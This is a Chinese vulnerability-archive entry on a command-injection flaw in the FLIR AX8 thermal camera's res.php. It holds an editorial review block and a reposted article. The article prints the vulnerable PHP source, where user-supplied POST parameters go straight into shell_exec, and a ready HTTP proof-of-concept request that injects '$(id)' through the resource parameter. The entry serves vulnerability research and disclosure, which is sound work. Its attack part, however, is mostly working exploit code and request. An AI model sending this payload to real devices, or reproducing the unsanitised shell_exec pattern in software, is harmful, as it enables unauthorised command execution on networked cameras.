---
version: "FLIR-AX8"
source: "MrWQ/vulnerability-paper"
id: "vw-02f698b01d4f83e2858cc5a6"
entity_id: "ve-02f698b01d4f83e2858cc5a6"
schema_version: "1"
title: "FLIR-AX8 res.php 命令执行漏洞"
product: "FLIR AX8"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "请求PHPSESSID，固件不明"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E6%99%BA%E8%83%BD%E8%AE%BE%E5%A4%87/FLIR/FLIR-AX8%20res.php%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "文中写入/上传步骤会创建或覆盖目标文件；须先核对服务账户写权限、保存路径和脚本解析条件，验证后按原路径核查残留；执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
source_url: "https://mp.weixin.qq.com/s/yjswlabuFelru9RQMLqvvA"
source_status: "recorded"
---

# FLIR-AX8 res.php 命令执行漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：FLIR AX8
- 本文讨论：res.php action=node resource shell执行
- 版本、权限与配置前提：请求PHPSESSID，固件不明
- 资料类型：热像仪命令注入源码；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 未明确后台鉴权，源码未含入口外层认证；请求头体缺空行
- 修复仅过滤resource但源码还有value/type/id等可控shell参数，覆盖不全
- 缺固件/CVE/官方修复
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 文中写入/上传步骤会创建或覆盖目标文件；须先核对服务账户写权限、保存路径和脚本解析条件，验证后按原路径核查残留
- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据

### 待核与来源

- 认证状态、参数/CVE映射和安全固件待核验
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/yjswlabuFelru9RQMLqvvA)

**漏洞说明**

FLIR-AX8 res.php 文件存在命令执行漏洞，攻击者可以获取服务器权限

**影响版本**

```
FLIR-AX8

```

漏洞复现  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/y0627QbVVbXYCDO93HxhSwH23K2hYUUdDd5n0SCD2iacLlkEPDMZJndnicVUUiabSP3sBomUic62SVRfEXOOrbqbWA/640?wx_fmt=png)

res.php

```
<?php
  if (isset($_POST["action"])) {
    switch ($_POST["action"]) {
      case "get":
        if(isset($_POST["resource"]))
        {
          switch ($_POST["resource"]) {
            case ".rtp.hflip":
              if (!file_exists("/FLIR/system/journal.d/horizontal_flip.cfg")) {
                $result = "false";
                break;
              }
              $result = file_get_contents("/FLIR/system/journal.d/horizontal_flip.cfg") === "1" ? "true" : "false";
              break;
            case ".rtp.vflip":
              if (!file_exists("/FLIR/system/journal.d/vertical_flip.cfg")) {
                $result = "false";
                break;
              }
              $result = file_get_contents("/FLIR/system/journal.d/vertical_flip.cfg") === "1" ? "true" : "false";
              break;
            default:
              $result = trim(shell_exec("LD_LIBRARY_PATH=/FLIR/usr/lib /FLIR/usr/bin/rls -o ".$_POST["resource"]));
          }
        }
        break;
      case "set":
        if(isset($_POST["resource"]) and isset($_POST["value"])) {
          switch ($_POST["resource"]) {
            case "rtp.hflip":
              file_put_contents("/FLIR/system/journal.d/horizontal_flip.cfg", $_POST["value"] === "true" ? "1" : "0");
              break;
            case "rtp.vflip":
              file_put_contents("/FLIR/system/journal.d/vertical_flip.cfg", $_POST["value"] === "true" ? "1" : "0");
              break;
            default:
              $result = trim(shell_exec("LD_LIBRARY_PATH=/FLIR/usr/lib /FLIR/usr/bin/rset ".$_POST["resource"]." ".$_POST["value"]));;
          }
        }
        break;
      case "measurement":
        if (isset($_POST["type"]) && isset($_POST["id"])) {
          $nodeData =  trim(shell_exec("LD_LIBRARY_PATH=/FLIR/usr/lib /FLIR/usr/bin/rls -i .image.sysimg.measureFuncs.".$_POST["type"].".".$_POST["id"]));
          $lines = explode("\n", $nodeData);
          foreach($lines as $line)
          {
            $resource = preg_split('/\s+/', $line);
            $value = trim($resource[1], "\"");
            $result[$resource[0]] = $value;
          }
        }
        break;
      case "global-parameters":
        $nodeData =  trim(shell_exec("LD_LIBRARY_PATH=/FLIR/usr/lib /FLIR/usr/bin/rls -i .image.sysimg.basicImgData.objectParams"));
        $lines = explode("\n", $nodeData);
        foreach($lines as $line)
        {
          $resource = preg_split('/\s+/', $line);
          $result[$resource[0]] = $resource[1];
        }
      case "alarm":
        if(isset($_POST["id"]))
        {
          $nodeData = trim(shell_exec("LD_LIBRARY_PATH=/FLIR/usr/lib /FLIR/usr/bin/rls .image.sysimg.alarms.measfunc.".$_POST["id"]));
          $lines = explode("\n", $nodeData);
          foreach($lines as $line)
          {
            $resource = preg_split('/\s+/', $line);
            $value = trim($resource[1], "\"");
            $result[$resource[0]] = $value;
          }
        }
        break;
      case "calibrate":
        $result = shell_exec("LD_LIBRARY_PATH=/FLIR/usr/lib /FLIR/usr/bin/nuc");
        break;
      case "node":
        $nodes = trim(shell_exec("LD_LIBRARY_PATH=/FLIR/usr/lib /FLIR/usr/bin/rls ".$_POST["resource"]));
        $result = preg_split("/\s+\n/", $nodes);
        break;
    }
    echo json_encode($result);
  }
?>

```

让可控参数: action 走到 node 后，使用可控参数: resource 执行命令

payload:  

```http
POST /res.php HTTP/1.1
Host: ip:port
Cookie: theme=light; distanceUnit=metric; temperatureUnit=celsius; showCameraId=false; clientTimeZoneDST=0; PHPSESSID=87215a3eabdc306e4bc37e58d18e4940; clientTimeZoneOffset=-480
Sec-Ch-Ua: "Chromium";v="113", "Not-A.Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Content-Length: 28
action=node&resource=$(id)

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/y0627QbVVbXYCDO93HxhSwH23K2hYUUdia4FyQrzSYDQxicmwZwdBY9eUx9MfDn9EtCLxOWtHAib5dsadXnQlnkCQ/640?wx_fmt=png)

**修复建议**

对可控参数 resource 进行过滤校验

本文章仅用于学习交流，不得用于非法用途

星标加关注，追洞不迷路

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
